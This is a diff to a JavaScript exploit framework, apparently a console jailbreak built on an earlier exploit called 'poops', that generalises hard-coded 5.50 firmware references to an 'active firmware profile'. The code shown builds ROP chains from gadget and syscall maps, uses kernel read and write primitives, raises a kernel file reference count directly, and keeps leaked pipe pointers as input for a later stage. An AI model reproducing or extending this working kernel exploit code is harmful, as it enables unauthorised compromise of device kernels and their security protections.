@@ -1,4 +1,4 @@
-// @egycnq
+// @egycnq (I rewrote egys impli of poops but 90% of his code is likely still factored in)
 
 export const ERRNO = {
   1: "EPERM",
@@ -261,7 +261,7 @@ export function makeHarness(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map (rop.js:78): " +
+          " has no stub in the active firmware profile (rop.js:78): " +
           why,
       );
     return P.syscalls[num];
@@ -273,8 +273,8 @@ export function makeHarness(X) {
       throw new Error(
         "gadget '" +
           name +
-          "' is not in the 5.50 " +
-          "wk_gadgetmap (rop.js:78): " +
+          "' is not in the active firmware " +
+          "gadget map (rop.js:78): " +
           why,
       );
     return g;
@@ -1540,7 +1540,7 @@ export function makeTwinEngine(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map: " +
+          " has no stub in the active firmware profile: " +
           why +
           ".",
       );
@@ -1550,7 +1550,7 @@ export function makeTwinEngine(X) {
     const g = P.gadgets[name];
     if (g === undefined)
       throw new Error(
-        "gadget '" + name + "' missing from the 5.50 " + "map: " + why,
+        "gadget '" + name + "' missing from the active firmware map: " + why,
       );
     return g;
   }
@@ -1775,7 +1775,7 @@ export function makeTwinEngine(X) {
       throw new Error(
         "emitCall: syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map",
+          " has no stub in the active firmware profile",
       );
     chain.fcall(stub, a1, a2, a3, a4, a5);
     chain.write_result4(retPtr);
@@ -3172,7 +3172,7 @@ export const PK = {
   LIBC_HANDLE: 0x2,
 
   // These must come from the selected firmware profile.  The old constants
-  // here were 5.50 addresses and would jump into the wrong 9.00 functions.
+  // here were stale firmware addresses and would jump into the wrong functions.
   LK_PTHREAD_CREATE_NAME_NP:
     typeof OFFSET_lk_pthread_create_name_np === "number"
       ? OFFSET_lk_pthread_create_name_np
@@ -3425,7 +3425,7 @@ export function makePoopsEngine(X) {
       throw new Error(
         "syscall 0x" +
           num.toString(16).toUpperCase() +
-          " has no stub in the 5.50 map: " +
+          " has no stub in the active firmware profile: " +
           why,
       );
     return P.syscalls[num];
@@ -5545,7 +5545,7 @@ export function makePoopsEngine(X) {
         hx(S.masterFp) +
         "), filedescent size 0x" +
         PK.OFF.FILEDESCENT_SIZE.toString(16) +
-        " or fd_ofiles wrong for 5.50";
+        " or fd_ofiles wrong for the active firmware profile";
       return false;
     }
 
@@ -7210,12 +7210,14 @@ export function makePoopsEngine(X) {
   }
 
   async function fholdFast(fp) {
-    const before = await kread32Fast(fp.add32(PK.OFF.FILE_F_COUNT));
+    const countAddr = fp.add32(PK.OFF.FILE_F_COUNT);
+    const before = await kread32Fast(countAddr);
     if (before.ret !== 4) return { ok: false, why: "f_count read short" };
-    await kwrite32Fast(fp.add32(PK.OFF.FILE_F_COUNT), (before.v + 1) >>> 0);
-    const after = await kread32Fast(fp.add32(PK.OFF.FILE_F_COUNT));
+    const next = (before.v + 1) >>> 0;
+    await kwrite32Fast(countAddr, next);
+    const after = await kread32Fast(countAddr);
     return {
-      ok: after.v === (before.v + 1) >>> 0,
+      ok: after.v === next,
       before: before.v,
       after: after.v,
     };
@@ -9198,9 +9200,9 @@ export function buildLadder(X, E) {
       }
       if (missing.length)
         return FAIL(
-          "missing syscall stubs in the 5.50 map: " + missing.join(", "),
+          "missing syscall stubs in the active firmware profile: " + missing.join(", "),
         );
-      note("all stage 0-2 syscall stubs present in the 326-entry 5.50 map");
+      note("all stage 0-2 syscall stubs present in the active firmware profile (" + Object.keys(P.syscalls).length + " entries)");
 
       const gadgets = [
         "pop rdi",
@@ -10366,7 +10368,7 @@ export function buildLadder(X, E) {
           "S2.7 did not run: fdescenttbl re-read failed, single " +
             "unrepeated read of the fd table base",
         );
-      note("the two pipe pointers are printed and discarded");
+      note("the two pipe pointers are retained in-process as Stage 3 input");
 
       return PASS(
         "fd_ofiles = " +
